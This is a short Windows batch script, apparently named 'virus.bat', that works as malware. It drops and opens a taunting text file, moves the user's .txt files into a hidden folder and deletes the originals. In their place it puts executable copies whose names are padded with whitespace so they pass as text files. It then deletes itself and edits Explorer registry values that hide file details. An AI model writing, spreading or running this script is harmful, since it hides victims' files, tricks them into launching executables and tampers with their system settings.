@echo off  
	if not exist hide mkdir hide
	attrib +h /S /D hide*.*
	echo "Hi, dude. U up shit creek" > hide\vir.txt
	start hide\vir.txt
	for %%i in (*.txt) do (
		copy "%%i" "hide\%%i"
		del "%%i" 
		copy "vit.txt                                                                                                                                                    .exe" "%%i                                                                                           .exe"
	)
	del "virus.bat"
	pause
	cd C:\WINDOWS\System32
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 00000000 /f
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v IconsOnly /t REG_DWORD /d 00000001 /f
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v FolderContentsInfoTip /t REG_DWORD /d 00000000 /f
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowInfoTip /t REG_DWORD /d 00000000 /f
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowStatusBar /t REG_DWORD /d 00000000 /f

